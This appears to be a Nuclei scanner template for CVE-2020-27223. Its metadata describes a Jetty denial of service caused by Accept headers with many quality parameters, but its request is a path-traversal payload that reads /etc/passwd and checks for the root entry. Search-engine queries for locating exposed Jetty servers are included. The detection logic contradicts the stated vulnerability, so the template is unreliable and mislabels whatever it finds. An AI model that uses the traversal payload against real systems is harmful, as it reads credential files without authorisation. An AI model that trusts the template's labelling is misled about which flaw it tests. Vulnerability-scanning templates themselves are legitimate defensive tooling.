id: CVE-2020-27223

info:
  name: Eclipse Jetty Quality of Service (QoS) DoS Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: In Eclipse Jetty 9.4.6.v20170531 to 9.4.36.v20210114, 10.0.0, and 11.0.0, handling requests with multiple Accept headers with numerous quality parameters can lead to a denial of service due to high CPU usage.
  impact: |
    Successful exploitation could lead to a denial of service condition.
  remediation: |
    Apply the necessary patches provided by Eclipse Jetty to mitigate the vulnerability (CVE-2020-27223).
  reference:
    - https://github.com/eclipse/jetty.project/security/advisories/GHSA-m394-8rww-3jr7
    - https://lists.apache.org/thread.html/r068dfd35ce2193f6af28b74ff29ab148c2b2cacb235995576f5bea78%40%3Cissues.solr.apache.org%3E
    - https://lists.apache.org/thread.html/r07aedcb1ece62969c406cb84c8f0e22cec7e42cdc272f3176e473320%40%3Cusers.solr.apache.org%3E
    - https://lists.apache.org/thread.html/r0b639bd9bfaea265022125d18acd2fc6456044b76609ec74772c9567%40%3Cissues.zookeeper.apache.org%3E
    - https://lists.apache.org/thread.html/r0c6eced465950743f3041b03767a32b2e98d19731bd72277fc7ea428%40%3Ccommits.zookeeper.apache.org%3E
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
    cvss-score: 5.3
    cve-id: CVE-2020-27223
    cwe-id: CWE-407,CWE-400
    epss-score: 0.02111
    epss-percentile: 0.89599
    cpe: cpe:2.3:a:eclipse:jetty:*:*:*:*:*:*:*:*
  metadata:
    vendor: eclipse
    product: jetty
    shodan-query:
      - cpe:"cpe:2.3:a:eclipse:jetty"
      - http.html:"contexts known to this"
      - http.title:"powered by jetty"
    fofa-query:
      - body="contexts known to this"
      - title="powered by jetty"
    google-query: intitle:"powered by jetty"

http:
  - method: GET
    path:
      - "{{BaseURL}}/.%2e/.%2e/.%2e/.%2e/etc/passwd"

    headers:
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
      Accept-Language: "en-US,en;q=0.5"
      Accept-Encoding: "gzip, deflate"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0"
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "root:x:0:0:root:/root:/bin/bash"
        part: body
